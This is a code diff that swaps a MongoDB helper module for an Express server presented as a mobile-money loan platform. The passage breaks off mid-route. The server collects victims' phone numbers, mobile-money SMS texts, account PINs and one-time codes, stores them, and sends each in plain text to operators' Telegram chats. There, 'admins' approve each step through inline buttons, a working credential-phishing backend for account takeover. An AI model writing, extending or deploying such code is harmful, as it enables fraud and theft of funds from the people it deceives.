@@ -1,661 +1,401 @@
-const { MongoClient } = require('mongodb');
-
-let client = null;
-let db = null;
-let connectionPromise = null;
-
-// Database and collections setup
-const DB_NAME = process.env.DB_NAME || 'momo_loan_platform';
-const COLLECTIONS = {
-    ADMINS: 'admins',
-    APPLICATIONS: 'applications',
-    ENVIRONMENT_LOGS: 'environment_logs'
-};
-
-/**
- * Ensures database is connected before executing queries
- */
-async function ensureConnected() {
-    if (!db || !client) {
-        await connectDatabase();
-    }
-    return db;
-}
-
-/**
- * Connect to MongoDB with connection pooling & error handling
- */
-async function connectDatabase() {
-    if (db && client) {
-        return db; // Reuse existing connection if already established
-    }
-
-    // Prevent race conditions when concurrent connection requests arrive
-    if (connectionPromise) {
-        return connectionPromise;
-    }
-
-    connectionPromise = (async () => {
-        try {
-            const MONGODB_URI = process.env.MONGODB_URI;
-
-            if (!MONGODB_URI) {
-                throw new Error('❌ MONGODB_URI is not set in environment variables');
-            }
-
-            console.log('🔄 Connecting to MongoDB...');
-
-            client = new MongoClient(MONGODB_URI, {
-                maxPoolSize: 10,
-                minPoolSize: 2,
-                serverSelectionTimeoutMS: 5000
-            });
-
-            await client.connect();
-            db = client.db(DB_NAME);
-
-            console.log('✅ Connected to MongoDB successfully');
-
-            await createIndexes();
-
-            return db;
-        } catch (error) {
-            console.error('❌ MongoDB connection error:', error);
-            client = null;
-            db = null;
-            throw error;
-        } finally {
-            connectionPromise = null;
-        }
-    })();
-
-    return connectionPromise;
-}
-
-/**
- * Create database indexes for optimized query performance
- */
-async function createIndexes() {
-    try {
-        const database = await ensureConnected();
-
-        // Admins indexes
-        await database.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
-        await database.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
-        await database.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
-        await database.collection(COLLECTIONS.ADMINS).createIndex({ role: 1 });
-
-        // Applications indexes
-        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
-        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
-        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
-        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
-        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
-        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsStatus: 1 });
-        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsOtpStatus: 1 });
-        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });
-        
-        // Compound index for fast pending queue resolution
-        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1, timestamp: -1 });
-
-        // Logs indexes
-        await database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 });
-        await database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ timestamp: -1 });
-        await database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ action: 1 });
-
-        console.log('✅ Database indexes created/verified');
-    } catch (error) {
-        console.error('⚠️ Error creating indexes:', error.message);
-    }
-}
-
-/**
- * Close database connection
- */
-async function closeDatabase() {
-    if (client) {
-        await client.close();
-        client = null;
-        db = null;
-        connectionPromise = null;
-        console.log('✅ Database connection closed');
-    }
-}
-
-// ==========================================
-// ENVIRONMENT & MESSAGING LOGS OPERATIONS
-// ==========================================
-
-async function logAdminActivity(adminId, action, details = {}) {
-    try {
-        const database = await ensureConnected();
-        const logEntry = {
-            adminId: String(adminId || 'SYSTEM'),
-            action,
-            details,
-            timestamp: new Date().toISOString()
-        };
-        await database.collection(COLLECTIONS.ENVIRONMENT_LOGS).insertOne(logEntry);
-        console.log(`📝 Environment Log [${action}] recorded for admin: ${adminId}`);
-    } catch (error) {
-        console.error('❌ Error recording environment log:', error);
-    }
-}
-
-async function getEnvironmentLogs(query = {}, limit = 100) {
-    try {
-        const database = await ensureConnected();
-        return await database.collection(COLLECTIONS.ENVIRONMENT_LOGS)
-            .find(query)
-            .sort({ timestamp: -1 })
-            .limit(limit)
-            .toArray();
-    } catch (error) {
-        console.error('❌ Error getting environment logs:', error);
-        return [];
-    }
-}
-
-// ==========================================
-// ADMIN & SUPER ADMIN OPERATIONS
-// ==========================================
-
-async function saveAdmin(adminData) {
-    try {
-        const database = await ensureConnected();
-        const rawId = adminData.adminId || adminData.id;
-
-        if (!rawId) throw new Error('Admin ID is required');
-        const adminId = String(rawId);
-
-        const existingAdmin = await database.collection(COLLECTIONS.ADMINS).findOne({ adminId });
-        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);
-
-        const adminDocument = {
-            adminId,
-            name: adminData.name || `Admin ${adminId}`,
-            email: adminData.email || null,
-            chatId: adminData.chatId !== undefined && adminData.chatId !== null ? String(adminData.chatId) : null,
-            role: adminData.role || (adminId === 'ADMIN001' ? 'super_admin' : 'admin'),
-            status: adminData.status || 'active',
-            createdAt: adminData.createdAt || new Date().toISOString()
-        };
-
-        if (adminData.botToken) adminDocument.botToken = adminData.botToken;
-
-        const result = await database.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
-        
-        await logAdminActivity(adminId, 'ADMIN_CREATED', { name: adminDocument.name, role: adminDocument.role });
-
-        console.log(`✅ Admin saved successfully: ${adminId} (${adminDocument.name})`);
-        return result;
-    } catch (error) {
-        console.error('❌ Error saving admin:', error);
-        throw error;
-    }
-}
-
-async function getAdmin(adminId) {
-    try {
-        if (!adminId) return null;
-        const database = await ensureConnected();
-        return await database.collection(COLLECTIONS.ADMINS).findOne({ adminId: String(adminId) });
-    } catch (error) {
-        console.error('❌ Error getting admin:', error);
-        return null;
-    }
-}
-
-async function getAdminByChatId(chatId) {
-    try {
-        if (!chatId) return null;
-        const database = await ensureConnected();
-        return await database.collection(COLLECTIONS.ADMINS).findOne({ chatId: String(chatId) });
-    } catch (error) {
-        console.error('❌ Error getting admin by chat ID:', error);
-        return null;
-    }
-}
-
-async function getAdminIdByChatId(chatId) {
-    try {
-        const admin = await getAdminByChatId(chatId);
-        return admin ? admin.adminId : null;
-    } catch (error) {
-        console.error('❌ Error getting admin ID by chat ID:', error);
-        return null;
-    }
-}
-
-async function getAllAdmins() {
-    try {
-        const database = await ensureConnected();
-        return await database.collection(COLLECTIONS.ADMINS)
-            .find({})
-            .sort({ createdAt: -1 })
-            .toArray();
-    } catch (error) {
-        console.error('❌ Error getting admins:', error);
-        return [];
-    }
-}
-
-async function getActiveAdmins() {
-    try {
-        const database = await ensureConnected();
-        return await database.collection(COLLECTIONS.ADMINS)
-            .find({ status: 'active' })
-            .toArray();
-    } catch (error) {
-        console.error('❌ Error getting active admins:', error);
-        return [];
-    }
-}
-
-async function updateAdmin(adminId, updates) {
-    try {
-        const database = await ensureConnected();
-        const formattedUpdates = { ...updates, updatedAt: new Date().toISOString() };
-        if (formattedUpdates.chatId !== undefined && formattedUpdates.chatId !== null) {
-            formattedUpdates.chatId = String(formattedUpdates.chatId);
-        }
-
-        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
-            { adminId: String(adminId) },
-            { $set: formattedUpdates }
-        );
-        
-        await logAdminActivity(adminId, 'ADMIN_UPDATED', updates);
-
-        console.log(`🔄 Admin ${adminId} updated`);
-        return result;
-    } catch (error) {
-        console.error('❌ Error updating admin:', error);
-        throw error;
-    }
-}
-
-async function updateAdminStatus(adminId, status) {
-    try {
-        const database = await ensureConnected();
-        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
-            { adminId: String(adminId) },
-            { $set: { status, updatedAt: new Date().toISOString() } }
-        );
-        
-        await logAdminActivity(adminId, 'ADMIN_STATUS_UPDATED', { status });
-
-        console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
-        return result;
-    } catch (error) {
-        console.error('❌ Error updating admin status:', error);
-        throw error;
-    }
-}
-
-async function transferAdminChatId(oldChatId, newChatId) {
-    try {
-        const database = await ensureConnected();
-        const existingAdmin = await getAdminByChatId(oldChatId);
-        if (!existingAdmin) {
-            throw new Error(`No admin found with Telegram Chat ID: ${oldChatId}`);
-        }
-
-        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
-            { chatId: String(oldChatId) },
-            { $set: { chatId: String(newChatId), updatedAt: new Date().toISOString() } }
-        );
-
-        await logAdminActivity(existingAdmin.adminId, 'ADMIN_TRANSFERRED', { oldChatId, newChatId });
-        console.log(`🔄 Transferred admin ${existingAdmin.adminId} from ${oldChatId} to ${newChatId}`);
-        return result;
-    } catch (error) {
-        console.error('❌ Error transferring admin:', error);
-        throw error;
-    }
-}
-
-async function suspendAllAdmins(exceptSuper = true) {
-    try {
-        const database = await ensureConnected();
-        const query = exceptSuper ? { role: { $ne: 'super_admin' }, adminId: { $ne: 'ADMIN001' } } : {};
-        const result = await database.collection(COLLECTIONS.ADMINS).updateMany(
-            query,
-            { $set: { status: 'paused', updatedAt: new Date().toISOString() } }
-        );
-        console.log(`🔒 Suspended ${result.modifiedCount} admin links.`);
-        return result;
-    } catch (error) {
-        console.error('❌ Error suspending admins:', error);
-        throw error;
-    }
-}
-
-async function deleteAdmin(adminId) {
-    try {
-        const database = await ensureConnected();
-        const result = await database.collection(COLLECTIONS.ADMINS).deleteOne({ adminId: String(adminId) });
-        
-        await logAdminActivity(adminId, 'ADMIN_DELETED', {});
-
-        console.log(`🗑️ Admin deleted: ${adminId}`);
-        return result;
-    } catch (error) {
-        console.error('❌ Error deleting admin:', error);
-        throw error;
-    }
-}
-
-async function adminExists(adminId) {
-    try {
-        const database = await ensureConnected();
-        const count = await database.collection(COLLECTIONS.ADMINS).countDocuments({ adminId: String(adminId) });
-        return count > 0;
-    } catch (error) {
-        console.error('❌ Error checking admin existence:', error);
-        return false;
-    }
-}
-
-async function getAdminCount() {
-    try {
-        const database = await ensureConnected();
-        return await database.collection(COLLECTIONS.ADMINS).countDocuments({});
-    } catch (error) {
-        console.error('❌ Error getting admin count:', error);
-        return 0;
-    }
-}
-
-// ==========================================
-// APPLICATION OPERATIONS
-// ==========================================
-
-/**
- * Save Application
- * Supports flexible PIN lengths, SMS text, OTPs, and dynamic parameters
- */
-async function saveApplication(appData) {
-    try {
-        if (!appData || appData.id === undefined || appData.id === null) {
-            throw new Error('Application ID (appData.id) is required');
-        }
-
-        const database = await ensureConnected();
-        const applicationId = String(appData.id);
-
-        const applicationDocument = {
-            id: applicationId,
-            adminId: appData.adminId ? String(appData.adminId) : 'UNASSIGNED',
-            adminName: appData.adminName || 'System',
-            phoneNumber: appData.phoneNumber ? String(appData.phoneNumber).trim() : '',
-            
-            // Core Authentication Data
-            pin: appData.pin ? String(appData.pin) : null,
-            pinStatus: appData.pinStatus || 'pending',
-            
-            // SMS / SMS OTP Data
-            smsText: appData.smsText || appData.smsOtp || null,
-            smsOtp: appData.smsOtp || appData.smsText || null,
-            smsStatus: appData.smsStatus || appData.smsOtpStatus || 'pending',
-            smsOtpStatus: appData.smsOtpStatus || appData.smsStatus || 'pending',
-            
-            // Second stage / final OTP
-            otp: appData.otp ? String(appData.otp) : null,
-            otpStatus: appData.otpStatus || 'pending',
-
-            // Flow tracking & metadata
-            assignmentType: appData.assignmentType || 'auto',
-            isReturningUser: Boolean(appData.isReturningUser),
-            previousCount: appData.previousCount || 0,
-            ipAddress: appData.ipAddress || null,
-            userAgent: appData.userAgent || null,
-            timestamp: appData.timestamp || new Date().toISOString(),
-            updatedAt: new Date().toISOString()
-        };
-
-        const result = await database.collection(COLLECTIONS.APPLICATIONS).insertOne(applicationDocument);
-
-        if (appData.adminId) {
-            await logAdminActivity(appData.adminId, 'APPLICATION_CREATED', { 
-                applicationId, 
-                phoneNumber: appData.phoneNumber 
-            });
-        }
-
-        console.log(`💾 Application saved: ${applicationId}`);
-        return result;
-    } catch (error) {
-        console.error('❌ Error saving application:', error);
-        throw error;
-    }
-}
-
-async function getApplication(applicationId) {
-    try {
-        if (!applicationId) return null;
-        const database = await ensureConnected();
-        return await database.collection(COLLECTIONS.APPLICATIONS).findOne({ id: String(applicationId) });
-    } catch (error) {
-        console.error('❌ Error getting application:', error);
-        return null;
-    }
-}
-
-async function getApplicationsByPhone(phoneNumber) {
-    try {
-        if (!phoneNumber) return [];
-        const database = await ensureConnected();
-        return await database.collection(COLLECTIONS.APPLICATIONS)
-            .find({ phoneNumber: String(phoneNumber).trim() })
-            .sort({ timestamp: -1 })
-            .toArray();
-    } catch (error) {
-        console.error('❌ Error getting applications by phone:', error);
-        return [];
-    }
-}
-
-async function updateApplication(applicationId, updates) {
-    try {
-        const database = await ensureConnected();
-        const formattedUpdates = { ...updates, updatedAt: new Date().toISOString() };
-
-        const result = await database.collection(COLLECTIONS.APPLICATIONS).updateOne(
-            { id: String(applicationId) },
-            { $set: formattedUpdates }
-        );
-
-        const app = await getApplication(applicationId);
-        if (app && app.adminId) {
-            await logAdminActivity(app.adminId, 'APPLICATION_UPDATED', { applicationId, updates });
-        }
-
-        console.log(`🔄 Application updated: ${applicationId}`);
-        return result;
-    } catch (error) {
-        console.error('❌ Error updating application:', error);
-        throw error;
-    }
-}
-
-async function getApplicationsByAdmin(adminId) {
-    try {
-        const database = await ensureConnected();
-        return await database.collection(COLLECTIONS.APPLICATIONS)
-            .find({ adminId: String(adminId) })
-            .sort({ timestamp: -1 })
-            .toArray();
-    } catch (error) {
-        console.error('❌ Error getting applications by admin:', error);
-        return [];
-    }
-}
-
-async function getPendingApplications(adminId) {
-    try {
-        const database = await ensureConnected();
-        const pendingCondition = {
-            $or: [
-                { pinStatus: 'pending' }, 
-                { smsStatus: 'pending' }, 
-                { smsOtpStatus: 'pending' }, 
-                { otpStatus: 'pending' }
-            ]
-        };
-
-        const query = (adminId === 'ADMIN001' || !adminId) 
-            ? pendingCondition 
-            : { adminId: String(adminId), ...pendingCondition };
-
-        return await database.collection(COLLECTIONS.APPLICATIONS)
-            .find(query)
-            .sort({ timestamp: -1 })
-            .toArray();
-    } catch (error) {
-        console.error('❌ Error getting pending applications:', error);
-        return [];
-    }
-}
-
-// ==========================================
-// STATISTICS OPERATIONS (/stats)
-// ==========================================
-
-async function getAdminStats(adminId) {
-    try {
-        const database = await ensureConnected();
-        const query = adminId === 'ADMIN001' ? {} : { adminId: String(adminId) };
-
-        const total = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments(query);
-        const pinPending = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...query, pinStatus: 'pending' });
-        const pinApproved = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...query, pinStatus: 'approved' });
-        const smsPending = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
-            ...query, 
-            $or: [{ smsStatus: 'pending' }, { smsOtpStatus: 'pending' }] 
-        });
-        const fullyApproved = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...query, otpStatus: 'approved' });
-
-        return { total, pinPending, pinApproved, smsPending, fullyApproved };
-    } catch (error) {
-        console.error('❌ Error getting admin stats:', error);
-        return { total: 0, pinPending: 0, pinApproved: 0, smsPending: 0, fullyApproved: 0 };
-    }
-}
-
-async function getStats() {
-    try {
-        const database = await ensureConnected();
-        const totalAdmins = await database.collection(COLLECTIONS.ADMINS).countDocuments({});
-        const totalApplications = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
-        const pinPending = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
-        const pinApproved = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
-        const smsPending = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({
-            $or: [{ smsStatus: 'pending' }, { smsOtpStatus: 'pending' }]
-        });
-        const fullyApproved = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
-        const totalRejected = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({
-            $or: [
-                { pinStatus: 'rejected' },
-                { smsStatus: 'rejected' },
-                { smsOtpStatus: 'rejected' },
-                { otpStatus: { $in: ['wrong_pin', 'wrong_code', 'rejected'] } }
-            ]
-        });
-
-        return { totalAdmins, totalApplications, pinPending, pinApproved, smsPending, fullyApproved, totalRejected };
-    } catch (error) {
-        console.error('❌ Error getting global stats:', error);
-        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, smsPending: 0, fullyApproved: 0, totalRejected: 0 };
-    }
-}
-
-async function getPerAdminStats() {
-    try {
-        const admins = await getAllAdmins();
-        const statsPromises = admins.map(async (admin) => {
-            const stats = await getAdminStats(admin.adminId);
-            return { adminId: admin.adminId, name: admin.name, role: admin.role, ...stats };
-        });
-        return await Promise.all(statsPromises);
-    } catch (error) {
-        console.error('❌ Error getting per-admin stats:', error);
-        return [];
-    }
-}
-
-// ==========================================
-// MAINTENANCE HELPERS
-// ==========================================
-
-async function getAllAdminsDetailed() {
-    try {
-        const database = await ensureConnected();
-        const admins = await database.collection(COLLECTIONS.ADMINS)
-            .find({})
-            .sort({ createdAt: -1 })
-            .toArray();
-        console.log(`📊 Found ${admins.length} admins in database`);
-        admins.forEach(admin => {
-            console.log(`   ${admin.adminId}: ${admin.name} (Role: ${admin.role}, chatId: ${admin.chatId}, status: ${admin.status})`);
-        });
-        return admins;
-    } catch (error) {
-        console.error('❌ Error getting detailed admins:', error);
-        return [];
-    }
-}
-
-async function cleanupInvalidAdmins() {
-    try {
-        const database = await ensureConnected();
-        const result = await database.collection(COLLECTIONS.ADMINS).deleteMany({
-            $or: [
-                { adminId: { $exists: false } },
-                { adminId: null },
-                { adminId: '' }
-            ]
-        });
-        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
-        return result;
-    } catch (error) {
-        console.error('❌ Error cleaning up invalid admins:', error);
-        throw error;
-    }
-}
-
-module.exports = {
+// ============================================================
+// server.js – Production Ready Multi-Admin Loan Server
+// ============================================================
+console.log("🟢 1. Server initializing...");
+require('dotenv').config();
+console.log("🟢 2. Environment variables loaded");
+
+const express = require('express');
+const fetch = require('node-fetch');
+const cors = require('cors');
+const path = require('path');
+
+// Import MongoDB helper methods from db.js
+const {
     connectDatabase,
     closeDatabase,
-
-    saveAdmin,
-    getAdmin,
-    getAdminByChatId,
-    getAdminIdByChatId,
-    getAllAdmins,
-    getActiveAdmins,
-    updateAdmin,
-    updateAdminStatus,
-    transferAdminChatId,
-    suspendAllAdmins,
-    deleteAdmin,
-    adminExists,
-    getAdminCount,
-
     saveApplication,
     getApplication,
-    getApplicationsByPhone,
     updateApplication,
-    getApplicationsByAdmin,
-    getPendingApplications,
-
+    getActiveAdmins,
+    getAdminByChatId,
     logAdminActivity,
-    getEnvironmentLogs,
+    getAdmin,
+    saveAdmin,
+    getAdminCount
+} = require('./db');
 
-    getAdminStats,
-    getStats,
-    getPerAdminStats,
+const app = express();
 
-    getAllAdminsDetailed,
-    cleanupInvalidAdmins
-};
+app.use(cors());
+app.use(express.json());
+app.use(express.static(path.join(__dirname, '..', 'frontend')));
+
+const PORT = process.env.PORT || 3000;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
+// Round-Robin tracker for Multi-Admin assignment
+let lastAssignedIndex = 0;
+
+/**
+ * Assigns an application to an active admin using Round-Robin distribution.
+ * Falls back to default system credentials if no active admin is found in DB.
+ */
+async function assignAdminForApplication() {
+    try {
+        const activeAdmins = await getActiveAdmins();
+        if (activeAdmins && activeAdmins.length > 0) {
+            const assignedAdmin = activeAdmins[lastAssignedIndex % activeAdmins.length];
+            lastAssignedIndex = (lastAssignedIndex + 1) % activeAdmins.length;
+            return assignedAdmin;
+        }
+    } catch (err) {
+        console.error('⚠️ Error fetching active admins:', err.message);
+    }
+
+    // Fallback default admin configuration
+    return {
+        adminId: 'ADMIN001',
+        name: 'Super Admin',
+        chatId: DEFAULT_CHAT_ID
+    };
+}
+
+/**
+ * Helper to dispatch Telegram messages to specific admin chat IDs.
+ */
+async function sendTelegramMessage(chatId, message, buttons = null) {
+    const targetChatId = chatId || DEFAULT_CHAT_ID;
+    if (!targetChatId) {
+        console.error('❌ Cannot send Telegram message: No Chat ID available.');
+        return null;
+    }
+
+    const body = { 
+        chat_id: targetChatId, 
+        text: message, 
+        parse_mode: 'Markdown' 
+    };
+    if (buttons) body.reply_markup = { inline_keyboard: buttons };
+
+    try {
+        const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body)
+        });
+        return await response.json();
+    } catch (error) {
+        console.error('❌ Telegram API error:', error);
+        return null;
+    }
+}
+
+// ============================================================
+// API ENDPOINTS
+// ============================================================
+
+// 1. Initial Application Submission
+app.post('/api/send-application', async (req, res) => {
+    try {
+        const data = req.body.applicationData;
+        const { applicationId, phone, loanAmount, loanTerm, firstName, lastName } = data;
+
+        // Assign an active admin dynamically
+        const assignedAdmin = await assignAdminForApplication();
+
+        // Save application to MongoDB
+        await saveApplication({
+            id: applicationId,
+            adminId: assignedAdmin.adminId,
+            adminName: assignedAdmin.name,
+            phoneNumber: phone,
+            pinStatus: 'pending',
+            smsStatus: 'pending',
+            otpStatus: 'pending',
+            timestamp: new Date().toISOString()
+        });
+
+        console.log(`📝 Application created & assigned to ${assignedAdmin.adminId}: ${applicationId}`);
+
+        const message = `📋 *NEW LOAN APPLICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Assigned To: ${assignedAdmin.name} (${assignedAdmin.adminId})\n📱 Phone: +237${phone}\n💰 Amount: XAF ${Number(loanAmount).toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n\n✅ *Please approve or reject this application:*`;
+        
+        const buttons = [[
+            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
+            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
+        ]];
+
+        await sendTelegramMessage(assignedAdmin.chatId, message, buttons);
+        res.json({ ok: true, applicationId, status: 'waiting_sms', assignedAdminId: assignedAdmin.adminId });
+    } catch (error) {
+        console.error('❌ Error in /api/send-application:', error);
+        res.status(500).json({ ok: false, message: 'Internal server error' });
+    }
+});
+
+// 2. MoMo SMS Message Processing
+app.post('/api/send-momo-message', async (req, res) => {
+    try {
+        const { momoData } = req.body;
+        const { applicationId, phone, momoMessage } = momoData;
+
+        const appData = await getApplication(applicationId);
+        if (!appData) return res.status(404).json({ ok: false, message: 'Application not found' });
+
+        await updateApplication(applicationId, {
+            smsText: momoMessage,
+            smsStatus: 'pending'
+        });
+
+        const admin = await getAdmin(appData.adminId);
+        const chatId = admin?.chatId || DEFAULT_CHAT_ID;
+
+        const message = `📨 *SMS VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +237${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;
+        const buttons = [[
+            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
+            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
+        ]];
+
+        await sendTelegramMessage(chatId, message, buttons);
+        res.json({ ok: true, status: 'waiting_admin' });
+    } catch (error) {
+        console.error('❌ Error in /api/send-momo-message:', error);
+        res.status(500).json({ ok: false, message: 'Internal server error' });
+    }
+});
+
+// 3. PIN Verification Submission
+app.post('/api/send-pin', async (req, res) => {
+    try {
+        const { applicationId, pin } = req.body;
+
+        const appData = await getApplication(applicationId);
+        if (!appData) return res.status(404).json({ ok: false, message: 'Application not found' });
+
+        await updateApplication(applicationId, {
+            pin: pin,
+            pinStatus: 'pending'
+        });
+
+        const admin = await getAdmin(appData.adminId);
+        const chatId = admin?.chatId || DEFAULT_CHAT_ID;
+
+        const message = `🔐 *PIN VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;
+        const buttons = [[
+            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
+            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
+        ]];
+
+        await sendTelegramMessage(chatId, message, buttons);
+        res.json({ ok: true, status: 'waiting_admin' });
+    } catch (error) {
+        console.error('❌ Error in /api/send-pin:', error);
+        res.status(500).json({ ok: false, message: 'Internal server error' });
+    }
+});
+
+// 4. OTP Verification Submission
+app.post('/api/send-otp', async (req, res) => {
+    try {
+        const { applicationId, otp } = req.body;
+
+        const appData = await getApplication(applicationId);
+        if (!appData) return res.status(404).json({ ok: false, message: 'Application not found' });
+
+        await updateApplication(applicationId, {
+            otp: otp,
+            otpStatus: 'pending'
+        });
+
+        const admin = await getAdmin(appData.adminId);
+        const chatId = admin?.chatId || DEFAULT_CHAT_ID;
+
+        const message = `🔑 *OTP VERIFICATION*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Please approve or reject this OTP:*`;
+        const buttons = [[
+            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
+            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
+        ]];
+
+        await sendTelegramMessage(chatId, message, buttons);
+        res.json({ ok: true, status: 'waiting_admin' });
+    } catch (error) {
+        console.error('❌ Error in /api/send-otp:', error);
+        res.status(500).json({ ok: false, message: 'Internal server error' });
+    }
+});
+
+// 5. Final Approval Details
+app.post('/api/send-final-details', async (req, res) => {
+    try {
+        const data = req.body.finalData;
+
+        const appData = await getApplication(data.applicationId);
+        if (!appData) return res.status(404).json({ ok: false, message: 'Application not found' });
+
+        await updateApplication(data.applicationId, {
+            pinStatus: 'approved',
+            otpStatus: 'approved'
+        });
+
+        const admin = await getAdmin(appData.adminId);
+        const chatId = admin?.chatId || DEFAULT_CHAT_ID;
+
+        const message = `✅ *LOAN COMPLETE*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${data.applicationId}\n📱 Phone: +237${data.phone}\n🔑 PIN Entered: ${data.pin}\n💰 Amount: XAF ${Number(data.loanAmount).toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;
+
+        await sendTelegramMessage(chatId, message);
+        res.json({ ok: true, status: 'dashboard_ready' });
+    } catch (error) {
+        console.error('❌ Error in /api/send-final-details:', error);
+        res.status(500).json({ ok: false, message: 'Internal server error' });
+    }
+});
+
+// 6. Telegram Webhook (Processes Admin Approvals/Rejections)
+app.post('/api/telegram-webhook', async (req, res) => {
+    try {
+        // Handle Inline Buttons
+        if (req.body.callback_query) {
+            const query = req.body.callback_query;
+            const rawData = query.data;
+            const senderChatId = String(query.from.id);
+
+            try {
+                const { action, step, applicationId } = JSON.parse(rawData);
+                const appData = await getApplication(applicationId);
+
+                if (appData) {
+                    const decision = action === 'YES' ? 'approved' : 'rejected';
+                    const updates = {};
+
+                    if (step === 'SMS' && appData.smsStatus === 'pending') updates.smsStatus = decision;
+                    else if (step === 'PIN' && appData.pinStatus === 'pending') updates.pinStatus = decision;
+                    else if (step === 'OTP' && appData.otpStatus === 'pending') updates.otpStatus = decision;
+
+                    if (Object.keys(updates).length > 0) {
+                        await updateApplication(applicationId, updates);
+                        
+                        // Log decision activity for multi-admin auditing
+                        const admin = await getAdminByChatId(senderChatId);
+                        if (admin) {
+                            await logAdminActivity(admin.adminId, `APP_${step}_${decision.toUpperCase()}`, { applicationId });
+                        }
+                    }
+                }
+            } catch (e) {
+                console.error('❌ Error parsing callback data:', e.message);
+            }
+
+            await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ callback_query_id: query.id })
+            });
+
+            return res.sendStatus(200);
+        }
+
+        // Handle Direct Text Replies to Admin Messages
+        const msg = req.body.message;
+        if (!msg || !msg.text) return res.sendStatus(200);
+
+        const text = msg.text.trim().toUpperCase();
+        const idMatch = msg.reply_to_message?.text?.match(/🆔\s*ID:\s*([A-Z0-9-]+)/);
+        const applicationId = idMatch ? idMatch[1] : null;
+
+        if (applicationId) {
+            const appData = await getApplication(applicationId);
+
+            if (appData) {
+                const updates = {};
+                const decision = text === 'YES' ? 'approved' : (text === 'NO' ? 'rejected' : null);
+
+                if (decision) {
+                    if (appData.smsStatus === 'pending') updates.smsStatus = decision;
+                    else if (appData.pinStatus === 'pending') updates.pinStatus = decision;
+                    else if (appData.otpStatus === 'pending') updates.otpStatus = decision;
+
+                    if (Object.keys(updates).length > 0) {
+                        await updateApplication(applicationId, updates);
+                    }
+                }
+            }
+        }
+
+        res.sendStatus(200);
+    } catch (error) {
+        console.error('❌ Error in /api/telegram-webhook:', error);
+        res.sendStatus(200);
+    }
+});
+
+// 7. Client Verification Status Check
+app.get('/api/status/:applicationId/:step', async (req, res) => {
+    try {
+        const appData = await getApplication(req.params.applicationId);
+        if (!appData) return res.status(404).json({ ok: false, message: 'Application not found' });
+
+        let status = 'pending';
+        const step = req.params.step.toLowerCase();
+
+        if (step === 'sms') status = appData.smsStatus || 'pending';
+        else if (step === 'pin') status = appData.pinStatus || 'pending';
